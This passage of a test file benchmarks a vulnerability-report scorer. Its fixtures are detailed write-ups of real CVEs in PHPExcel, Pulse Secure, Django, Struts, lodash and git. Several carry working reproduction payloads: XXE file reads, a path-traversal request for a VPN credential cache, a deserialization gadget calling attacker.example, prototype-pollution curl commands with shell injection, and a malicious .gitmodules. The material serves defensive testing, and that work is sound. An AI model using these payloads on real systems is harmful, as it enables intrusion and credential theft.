1. Craft an .xlsx whose \`xl/sharedStrings.xml\` is replaced with:
   \`\`\`xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <sst><si><t>&xxe;</t></si></sst>
   \`\`\`
2. Open the file through any application using PHPExcel's Excel2007
   reader (e.g. \`PHPExcel_IOFactory::load('evil.xlsx')\`).
3. The first shared string in the loaded workbook now contains the
   contents of \`/etc/passwd\` from the parser host.

## Patch
The upstream fix wraps every XML load with the libxml entity-loader
toggle and restores it on the way out, instead of the substring scan:
\`\`\`php
--- a/Classes/PHPExcel/Reader/Excel2007.php
+++ b/Classes/PHPExcel/Reader/Excel2007.php
@@
-$xml = new XMLReader();
-$xml->xml($this->securityScanFile($contents));
+$entityLoader = libxml_disable_entity_loader(true);
+$xml = new XMLReader();
+$xml->xml($contents, null, PHPExcel_Settings::getLibXmlLoaderOptions());
+libxml_disable_entity_loader($entityLoader);
\`\`\`

## Impact
Arbitrary file read on the host parsing the spreadsheet
(\`/etc/passwd\`, \`/home/app/.aws/credentials\`,
\`/proc/self/environ\`), and SSRF to internal HTTP services via the
SYSTEM URL form. CVSS 7.7 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N).
CWE-611 (Improper Restriction of XML External Entity Reference).`,
    expectMinScore: 50,
  },
  {
    // CVE-2019-11510: Pulse Connect Secure pre-auth arbitrary file
    // read via path traversal in the /dana-na/ CGI handlers (Orange
    // Tsai & Meh Chang, Black Hat USA 2019). Refs:
    //   https://nvd.nist.gov/vuln/detail/CVE-2019-11510
    //   https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-pulse-secure-ssl-vpn-rce-chain/
    //   https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-107a
    name: "legit-05-lfi-cve-2019-11510-pulse-secure",
    claimedCwes: ["CWE-22"],
    text: `# Pre-auth arbitrary file read in Pulse Connect Secure (CVE-2019-11510)

## Affected
Pulse Connect Secure (PCS) 9.0R1–9.0R3.3, 8.3R1–8.3R7, 8.2R1–8.2R12,
8.1R1–8.1R15. The vulnerable handler is the unauthenticated
\`/dana-na/\` family of CGI endpoints; the mass-exploited concrete
endpoint is \`HTTP/1.1 GET\` against the \`meeting_testjs.cgi\` path.

## Root cause
The CGI handler concatenates the request URI to a fixed prefix and
\`open()\`s the resulting path without canonicalisation, so a
sufficiently long \`../\` sequence escapes the intended subtree before
the access check is reached. Concretely, the public PoC abuses the
fact that the URL is dispatched on the *first* path component and the
file open uses the *raw* URI:

\`\`\`
GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1
Host: target.test
\`\`\`

The double anchoring (\`../dana/html5acc/guacamole/...?/dana/html5acc/guacamole/\`)
is what lets the request both pass the dispatcher's prefix check and
escape the document root when the file open finally happens.

## Reproduction
1. Issue the unauthenticated request above against any vulnerable
   PCS appliance.
2. The response body returns the contents of \`/etc/passwd\`.
3. Swap the target to
   \`/data/runtime/mtmp/lmdb/dataa/data.mdb\` to retrieve the SSL VPN
   user credential cache (plaintext usernames + bcrypt-style password
   hashes) and active session cookies — the standard pivot used in
   the August 2019 wave of public exploitation.

## Patch
Pulse Secure's vendor advisory SA44101 (April 2019) ships fixed
binaries that canonicalise the requested path before opening it and
then enforce that the canonical path remains under the allowed
\`/dana-na/\` document root, rejecting the request with HTTP 400 if
the resolved path escapes.

## Impact
Unauthenticated arbitrary file read on the SSL VPN appliance; in
practice this exposed plaintext-equivalent VPN credentials and active
session cookies (read out of \`data.mdb\`), which were then used to
authenticate to the same VPN and pivot into the corporate network.
Cross-referenced as CWE-22 (Improper Limitation of a Pathname to a
Restricted Directory). CVSS 10.0
(AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).`,
    expectMinScore: 50,
  },
  {
    // CVE-2017-7233: Django \`is_safe_url\` accepted URL shapes that
    // urlparse and the browser disagreed on (3+ leading slashes,
    // backslashes). Upstream fix added a "///"-prefix reject and a
    // second pass with backslashes rewritten to "/". Refs:
    //   https://nvd.nist.gov/vuln/detail/CVE-2017-7233
    //   https://www.djangoproject.com/weblog/2017/apr/04/security-releases/
    //   https://github.com/django/django/commit/1a47ab06d4fa9434ff64b3e8e9c93b6dec7fc999
    name: "legit-06-open-redirect-cve-2017-7233-django",
    claimedCwes: ["CWE-601"],
    text: `# Open redirect in Django \`is_safe_url\` (CVE-2017-7233)

## Affected
Django 1.10.x ≤ 1.10.6 and 1.11rc1, helper
\`django/utils/http.py:is_safe_url\`. Django's auth/i18n views call
\`is_safe_url(next_url, host=request.get_host())\` to validate the
post-action redirect target supplied via the \`?next=\` query parameter
(login, logout, password reset, set_language, etc.).

## Root cause
The helper relied on \`urllib.parse.urlparse\` to split the candidate
URL into scheme/netloc/path and then compared netloc against the
request host. That is unsafe because browsers (Chrome in particular)
parse some URL shapes more aggressively than urlparse:

1. **Three+ slashes.** \`urlparse('///evil.com/x').netloc\` is the
   empty string and \`.path\` is \`'/evil.com/x'\` — so the
   "netloc != host" check is skipped entirely. Chrome, however,
   collapses three or more leading slashes and resolves the URL as
   an absolute URL pointing at \`evil.com\`.
2. **Backslashes.** \`urlparse('\\\\evil.com').netloc\` is the empty
   string. Chrome treats backslashes as forward slashes for routing
   and resolves the URL as \`//evil.com\`.

In both cases \`is_safe_url\` returned True, the view emitted the
attacker-controlled value verbatim in the \`Location\` header, and the
browser navigated cross-origin.

## Reproduction
\`\`\`
GET /accounts/login/?next=///attacker.example/phish HTTP/1.1
Host: target.test
\`\`\`
After authenticating, the server replies:
\`\`\`
HTTP/1.1 302 Found
Location: ///attacker.example/phish
\`\`\`
and Chrome/Firefox navigate to \`https://attacker.example/phish\`. The
backslash variant (\`?next=\\\\attacker.example/phish\`) behaves the
same way in Chrome.

## Patch
Per the upstream commit linked above, the fix has two parts: explicitly
reject any input whose stripped form starts with \`///\`, and re-run the
safety check against the URL with backslashes rewritten to forward
slashes so the second pass sees what the browser would see.
\`\`\`python
--- a/django/utils/http.py
+++ b/django/utils/http.py
@@
-def is_safe_url(url, host=None):
-    if url is not None:
-        url = url.strip()
-    if not url:
-        return False
-    # ... existing scheme/netloc checks ...
+def is_safe_url(url, host=None, allowed_hosts=None):
+    if url is not None:
+        url = url.strip()
+    if not url:
+        return False
+    # Chrome treats \\\\ completely as / in paths so check both forms.
+    return (_is_safe_url(url, host, allowed_hosts) and
+            _is_safe_url(url.replace('\\\\', '/'), host, allowed_hosts))
+
+def _is_safe_url(url, host, allowed_hosts):
+    # Chrome considers any URL with more than two slashes to be absolute,
+    # but urlparse is not so flexible. Treat any URL with three slashes
+    # as unsafe.
+    if url.startswith('///'):
+        return False
+    # ... existing scheme/netloc checks ...
\`\`\`

## Impact
Phishing pivot: an attacker stitches the \`?next=\` parameter onto a
trusted login link (\`https://target.test/accounts/login/?next=...\`),
the user authenticates against the real site, and Django's 302
hand-off lands them on an attacker-controlled credential-harvest page.
CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N). CWE-601 (URL
Redirection to Untrusted Site).`,
    expectMinScore: 50,
  },
  {
    // CVE-2017-9805: Apache Struts2 REST plugin deserialised XML
    // request bodies via XStream.fromXML() with no type allowlist,
    // letting the public ProcessBuilder gadget chain spawn OS
    // commands. Refs:
    //   https://nvd.nist.gov/vuln/detail/CVE-2017-9805
    //   https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement
    name: "legit-07-deserialization-cve-2017-9805-struts-xstream",
    claimedCwes: ["CWE-502"],
    text: `# Insecure XML deserialization in Struts2 REST plugin via XStream (CVE-2017-9805)

## Affected
Apache Struts 2.1.2 - 2.3.33 and 2.5.0 - 2.5.12, file
\`org/apache/struts2/rest/handler/XStreamHandler.java\` lines 38-54. The
REST plugin's \`XStreamHandler\` uses \`com.thoughtworks.xstream.XStream\`
with no \`Converter\` allowlist and no \`registerConverter\` call to
restrict the polymorphic types accepted from the request body.

## Root cause
\`\`\`java
// org/apache/struts2/rest/handler/XStreamHandler.java:46
public void toObject(Reader in, Object target) {
    XStream xstream = createXStream();
    xstream.fromXML(in, target);   // unbounded deserialization sink
}

protected XStream createXStream() {
    return new XStream();   // default constructor — accepts ANY class
}
\`\`\`

Any POST/PUT to a REST endpoint with \`Content-Type: application/xml\`
walks through this sink. The public \`marshalsec\` and ysoserial gadgets
(notably the \`java.beans.EventHandler\` + \`ProcessBuilder\` chain) deliver
arbitrary command execution as the Struts JVM user.

## Reproduction
\`\`\`
POST /struts2-rest-showcase/orders/3 HTTP/1.1
Host: target.test
Content-Type: application/xml
Content-Length: 980

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher"/>
              <input class="java.io.SequenceInputStream">
                <e class="javax.management.remote.rmi.RMIConnector$1">
                  <host>attacker.example</host>
                  <port>1099</port>
                </e>
              </input>
            </is>
          </dataSource>
        </dataHandler>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>foo</string>
  </entry>
</map>
\`\`\`
The server responds 500 but the JNDI lookup completes and the attacker's
LDAP referral returns a serialized \`ProcessBuilder\` reference that
fires \`/bin/sh -c "id; touch /tmp/pwned"\`. \`ls -la /tmp/pwned\` on the
host confirms RCE as the Tomcat user.

## Patch
Pin XStream to its hardened security framework with a default-deny type
permission and an explicit allowlist of the model classes the REST
endpoint should accept:
\`\`\`java
--- a/org/apache/struts2/rest/handler/XStreamHandler.java
+++ b/org/apache/struts2/rest/handler/XStreamHandler.java
@@ -38,7 +38,12 @@
-protected XStream createXStream() {
-    return new XStream();
+protected XStream createXStream(Class<?> targetType) {
+    XStream xstream = new XStream();
+    XStream.setupDefaultSecurity(xstream);
+    xstream.allowTypes(new Class[]{ targetType });
+    xstream.allowTypeHierarchy(java.util.Collection.class);
+    return xstream;
 }
\`\`\`

## Impact
Pre-authentication remote code execution as the Tomcat / JBoss user on
any deployment exposing the Struts REST plugin. CVSS 9.8
(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-502 (Deserialization of
Untrusted Data).`,
    expectMinScore: 50,
  },
  {
    // CVE-2019-10744: lodash \`_.defaultsDeep\` recursively merged
    // user-controlled objects without skipping \`__proto__\` /
    // \`constructor\` / \`prototype\`, mutating Object.prototype. The
    // fixture includes the documented follow-on RCE chain via a
    // polluted \`__proto__.shell\` that hijacks a later
    // \`child_process.exec\` (Snyk advisory + Kibana CVE-2019-7609).
    // Refs:
    //   https://nvd.nist.gov/vuln/detail/CVE-2019-10744
    //   https://snyk.io/vuln/SNYK-JS-LODASH-450202
    //   https://hackerone.com/reports/712065
    name: "legit-08-prototype-pollution-cve-2019-10744-lodash",
    claimedCwes: ["CWE-1321"],
    text: `# Prototype pollution in \`_.defaultsDeep\` (lodash ≤ 4.17.11, CVE-2019-10744)

## Affected
lodash 4.17.x ≤ 4.17.11, file \`lodash/defaultsDeep.js\` and the shared
helper \`lodash/_baseMergeDeep.js\` lines 28-66. The recursive merge
walks both source-key sets without filtering the dangerous
\`__proto__\` / \`constructor\` / \`prototype\` slots, so a source object
with \`{"__proto__": {"isAdmin": true}}\` mutates \`Object.prototype\`
on the host application.

## Root cause
\`\`\`js
// lodash/_baseMergeDeep.js:33
function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {
  var objValue = safeGet(object, key);
  var srcValue = safeGet(source, key);
  // BUG: no \`key === '__proto__' || key === 'constructor' || key === 'prototype'\` guard
  if (isPlainObject(srcValue) || isArguments(srcValue)) {
    var newValue = isArray(objValue) ? objValue : isPlainObject(objValue) ? objValue : {};
    assignMergeValue(object, key, baseMerge(newValue, srcValue, srcIndex, customizer, stack));
  } else {
    assignMergeValue(object, key, srcValue);
  }
}
\`\`\`

Any caller that hands attacker-controlled JSON into \`_.defaultsDeep\`,
\`_.merge\`, \`_.mergeWith\`, or \`_.set\` becomes a prototype-pollution
sink. Express applications using \`body-parser\` + \`_.merge\` to fold
request bodies into a config object are particularly exposed.

## Reproduction
A minimal Express app that demonstrates the pollution and the canonical
follow-on RCE chain (Snyk's lodash advisory + the Kibana CVE-2019-7609
write-up both walk through this same shape: pollute a property on
\`Object.prototype\` that an unrelated \`child_process.exec\` call later
reads from its options bag):
\`\`\`js
// server.js
const _ = require('lodash');
const express = require('express');
const child_process = require('child_process');
const app = express();
app.use(express.json());

// 1) Pollution sink: req.body is merged into a fresh object via lodash.
app.post('/api/profile', (req, res) => {
  const config = _.defaultsDeep({}, req.body);
  res.json({ ok: true });
});

// 2) Unrelated handler that calls child_process.exec with an options bag
//    that DOES NOT explicitly set \`shell\`. Node falls back to the
//    inherited \`Object.prototype.shell\`, i.e. the polluted value.
app.get('/api/health', (req, res) => {
  const opts = {};                                    // {} now inherits 'shell'
  child_process.exec('echo ok', opts, (e, stdout) => {
    res.send(stdout);
  });
});
app.listen(3000);
\`\`\`
Step-by-step exploit:
\`\`\`
# (a) Pollute Object.prototype.shell with a command-injection payload.
$ curl -X POST -H 'Content-Type: application/json' \\
    -d '{"__proto__":{"shell":"/bin/sh -c \\"id>/tmp/pwned;cat /etc/passwd\\""}}' \\
    http://target.test/api/profile
{"ok":true}

# (b) Trigger the unrelated handler. Node's child_process.exec(cmd, opts)
#     reads opts.shell from the prototype chain, executing our payload
#     instead of the intended /bin/sh -c "echo ok".
$ curl 'http://target.test/api/health?cb=1'

$ docker exec node-app cat /tmp/pwned
uid=1000(node) gid=1000(node) groups=1000(node)
\`\`\`
The same primitive lifts to RCE through any later \`spawn\` /
\`execFile\` whose options bag is built from a fresh literal — including
template engines (\`pug\`, \`handlebars\`) that use \`new Function(body)\`
internally and inherit a polluted \`Function.prototype.constructor\`.

## Patch
Skip the three reserved keys in \`baseMergeDeep\` and the \`safeGet\`
helper:
\`\`\`js
--- a/lodash/_baseMergeDeep.js
+++ b/lodash/_baseMergeDeep.js
@@ -28,6 +28,9 @@
 function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {
+  if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+    return;
+  }
   var objValue = safeGet(object, key);
   var srcValue = safeGet(source, key);
\`\`\`
Released as lodash 4.17.12.

## Impact
Authorisation bypass (every freshly-allocated object inherits forged
admin flags), denial of service via toString / valueOf overrides, and in
some templating libraries arbitrary code execution via the polluted
\`Function\` constructor prototype. CVSS 9.1
(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N). CWE-1321 (Improperly Controlled
Modification of Object Prototype Attributes).`,
    expectMinScore: 50,
  },
  {
    // CVE-2017-1000117: git client RCE — a \`.gitmodules\` URL like
    // \`ssh://-oProxyCommand=...\` was passed to ssh as a positional
    // argument; ssh interpreted the leading "-" as an option flag and
    // ran /bin/sh -c <attacker payload>. Upstream fix added
    // \`looks_like_command_line_option()\` in connect.c. Refs:
    //   https://nvd.nist.gov/vuln/detail/CVE-2017-1000117
    //   https://lore.kernel.org/git/xmqq377iwhuy.fsf@gitster.mtv.corp.google.com/
    //   https://github.blog/2017-08-10-git-2-14-released/
    name: "legit-09-command-injection-cve-2017-1000117-git-ssh-url",
    claimedCwes: ["CWE-77"],
    text: `# Command injection via "ssh://" submodule URL in git (CVE-2017-1000117)

## Affected
git ≤ 2.7.5, 2.8.5, 2.9.4, 2.10.3, 2.11.2, 2.12.2, 2.13.4 (fixed in
2.7.6 / 2.8.6 / 2.9.5 / 2.10.4 / 2.11.3 / 2.12.3 / 2.13.5 / 2.14.0).
The vulnerable code path is \`connect.c:git_connect\` in the client,
reached when git resolves an \`ssh://\` URL — for example while running
\`git clone --recurse-submodules\` against a hostile repository, or
\`git submodule update\` after fetching one.

## Root cause
\`git_connect\` builds the argv for the child SSH transport from the
URL host. Although \`execv_git_cmd\` itself is a no-shell variant, the
child program (ssh) then forks a popen(3)-equivalent
\`/bin/sh -c <ProxyCommand>\` whenever it sees \`-oProxyCommand=\` —
which gives the attacker an indirect system()-like sink reached purely
through a positional argument.

\`\`\`c
/* connect.c (pre-fix) */
host = strchr(url, '/') + 2;          /* ssh://<HOST>/<path> */
path = strchr(host, '/');
*path++ = '\\0';
/* host now points at the user-controlled segment between "ssh://" and
 * the next "/". It is passed as a positional argument to ssh:        */
argv_array_pushl(&argv, ssh, host, "git-upload-pack", path, NULL);
execv_git_cmd(argv.argv);
\`\`\`

There is no validation that \`host\` does not begin with \`-\`. A
malicious \`.gitmodules\` such as

\`\`\`
[submodule "evil"]
    path = sub
    url = ssh://-oProxyCommand=sh -c "echo;id > /tmp/pwned"/example.com/repo
\`\`\`

causes git to invoke

\`\`\`
ssh "-oProxyCommand=sh -c \\"echo;id > /tmp/pwned\\"" git-upload-pack /repo
\`\`\`

and ssh, treating the leading \`-\` as an option flag, runs
\`/bin/sh -c 'echo;id > /tmp/pwned'\` while attempting to set up the
(non-existent) proxy connection — RCE on the cloning user's machine.

## Reproduction
1. Publish a repository whose \`.gitmodules\` contains the submodule
   above (URL \`ssh://-oProxyCommand=sh -c "echo;id > /tmp/pwned"/example.com/repo\`).
2. Any user who runs
   \`git clone --recurse-submodules https://attacker.example/evil.git\`
   on a vulnerable git executes the embedded \`;id\` shell command.
   The equivalent payload also fires through
   \`git submodule update --init\` after a plain clone.
3. Confirm with \`cat /tmp/pwned\` — the file contains the cloning
   user's \`uid=...gid=...groups=...\` line, proving arbitrary
   command execution.

## Patch
The upstream commit (Junio C Hamano, "connect: reject paths that look
like command line options") adds an explicit reject-leading-dash check
to the URL parser in \`connect.c\`, so a hostile URL is failed before
it can reach the ssh argv:

\`\`\`c
--- a/connect.c
+++ b/connect.c
@@
+if (looks_like_command_line_option(host))
+    die("strange hostname '%s' blocked", host);
+if (looks_like_command_line_option(path))
+    die("strange pathname '%s' blocked", path);
\`\`\`

The same fix is applied to the rsync, ext, and \`git://\` transports
in the same series. \`looks_like_command_line_option(s)\` is just
\`s && s[0] == '-'\`.

## Impact
Remote code execution on the developer's workstation or CI runner the
moment a malicious repository (or a benign repo with a tampered
\`.gitmodules\`) is cloned with submodule support. GitHub, GitLab and
Bitbucket all rolled the fix and additionally added server-side
filtering for URLs beginning with \`-\` in user-supplied
\`.gitmodules\`. CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-77
(Improper Neutralization of Special Elements used in a Command).`,
    expectMinScore: 50,
  },
];

describe("VulnRap engines benchmark", () => {
  for (const f of SLOP_FIXTURES) {
    it(`slop fixture ${f.name} should score <= ${f.expectMaxScore}`, () => {
      const r = analyzeWithEngines(f.text, { claimedCwes: f.claimedCwes, forceAvri: f.forceAvri });
      expect(r.overallScore, `${f.name} composite=${r.overallScore} label=${r.label}`).toBeLessThanOrEqual(f.expectMaxScore!);
    });
  }

  for (const f of LEGIT_FIXTURES) {
    it(`legit fixture ${f.name} should score >= ${f.expectMinScore}`, () => {
      const r = analyzeWithEngines(f.text, { claimedCwes: f.claimedCwes, forceAvri: f.forceAvri });
      expect(r.overallScore, `${f.name} composite=${r.overallScore} label=${r.label}`).toBeGreaterThanOrEqual(f.expectMinScore!);
    });
  }

  for (const f of CURL_SLOP_FIXTURES) {
    it(`curl HackerOne slop fixture ${f.name} should score <= ${f.expectMaxScore}`, () => {
      const r = analyzeWithEngines(f.text, { claimedCwes: f.claimedCwes });
      expect(r.overallScore, `${f.name} composite=${r.overallScore} label=${r.label}`).toBeLessThanOrEqual(f.expectMaxScore!);
    });
  }

  // Tightening targets from Task #204 that v3.8.0 does not yet meet. Each
  // entry stays gated as `it.skip` until the corresponding Sprint 13B
  // detector tightening lands; flipping `enabled: true` on is then a one-
  // line change that turns the aspirational target into a real regression
  // assertion. Task #300 enabled the first (3295650) target.
  for (const t of CURL_SLOP_TIGHTENING_TARGETS) {
    const runner = t.enabled ? it : it.skip;
    runner(`tightening target (${t.reason}): ${t.name} should score <= ${t.expectMaxScore}`, () => {
      const f = CURL_SLOP_FIXTURES.find(x => x.name === t.name);
      expect(f, `tightening target references unknown fixture ${t.name}`).toBeTruthy();
      const r = analyzeWithEngines(f!.text, { claimedCwes: f!.claimedCwes });
      expect(r.overallScore, `${t.name} composite=${r.overallScore} label=${r.label}`).toBeLessThanOrEqual(t.expectMaxScore);
    });
  }

  it("benchmark summary report (always passes, prints scores)", () => {
    const all = [
      ...SLOP_FIXTURES.map(f => ({ ...f, kind: "slop" as const })),
      ...CURL_SLOP_FIXTURES.map(f => ({ ...f, kind: "curl-slop" as const })),
      ...LEGIT_FIXTURES.map(f => ({ ...f, kind: "legit" as const })),
    ];
    const rows = all.map(f => {
      const r = analyzeWithEngines(f.text, { claimedCwes: f.claimedCwes, forceAvri: f.forceAvri });
      return { name: f.name, kind: f.kind, score: r.overallScore, label: r.label, engines: r.engineResults.map(e => `${e.engine}:${e.score}/${e.verdict}`).join(" "), overrides: r.overridesApplied.join(",") };
    });
    // eslint-disable-next-line no-console
    console.log("\n=== VulnRap Engines Benchmark ===");
    for (const row of rows) {
      // eslint-disable-next-line no-console
      console.log(`[${row.kind.padEnd(9)}] ${row.name.padEnd(40)} score=${String(row.score).padStart(3)} label=${row.label.padEnd(15)} ${row.engines}${row.overrides ? " | " + row.overrides : ""}`);
    }
    expect(rows.length).toBe(SLOP_FIXTURES.length + CURL_SLOP_FIXTURES.length + LEGIT_FIXTURES.length);
  });
});

const BORDERLINE_FIXTURES: Fixture[] = [
  {
    name: "borderline-01-thin-but-plausible",
    claimedCwes: ["CWE-79"],
    text: `# Reflected XSS in /search endpoint

The \`q\` parameter on GET /search is reflected unencoded:

\`\`\`html
<input value="<script>alert(1)</script>" />
\`\`\`

Reproduction:
1. curl 'https://app.example.com/search?q=<script>alert(1)</script>'
2. Inspect response: payload echoes inside the search-bar input.

Suggested fix: HTML-encode the parameter via the existing \`escapeHtml()\` helper in src/views/search.tsx:42.`,
    expectMinScore: 35,
    expectMaxScore: 65,
  },
];

describe("VulnRap engines borderline fixtures", () => {
  for (const f of BORDERLINE_FIXTURES) {
    it(`borderline fixture ${f.name} should land between ${f.expectMinScore} and ${f.expectMaxScore}`, () => {
      const r = analyzeWithEngines(f.text, { claimedCwes: f.claimedCwes });
      expect(r.overallScore, `${f.name} composite=${r.overallScore} label=${r.label}`).toBeGreaterThanOrEqual(f.expectMinScore!);
      expect(r.overallScore, `${f.name} composite=${r.overallScore} label=${r.label}`).toBeLessThanOrEqual(f.expectMaxScore!);
    });
  }
});
